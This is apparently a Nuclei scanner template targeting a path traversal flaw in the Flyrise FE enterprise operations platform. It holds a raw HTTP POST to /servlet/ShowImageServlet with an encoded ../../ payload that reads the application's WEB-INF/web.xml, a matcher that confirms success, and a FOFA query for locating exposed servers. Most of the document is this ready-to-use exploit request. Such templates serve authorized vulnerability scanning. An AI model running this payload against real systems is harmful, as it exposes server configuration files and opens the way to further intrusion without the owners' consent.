id: flyrise-ShowImageServlet-traversal-1

info:
  name: 飞企互联 FE 企业运营管理平台 ShowImageServlet - traversal
  author: leadlife
  severity: high
  metadata:
    verified: true
    fofa-qeury: app="飞企互联-FE企业运营管理平台"
  tags: flyrise,traversal

http:
  - raw:
      - |
        POST /servlet/ShowImageServlet  HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0
        Content-Type: application/x-www-form-urlencoded
        
        IMGGUID=..%2F..%2Fjboss%2Fweb%2Ffe.war%2FWEB-INF%2Fweb.xml&imagePath=/&print=1

    matchers:
      - type: dsl
        dsl:
          - "status_code==200 && contains(body,'web-app') && contains(body,'xml')"
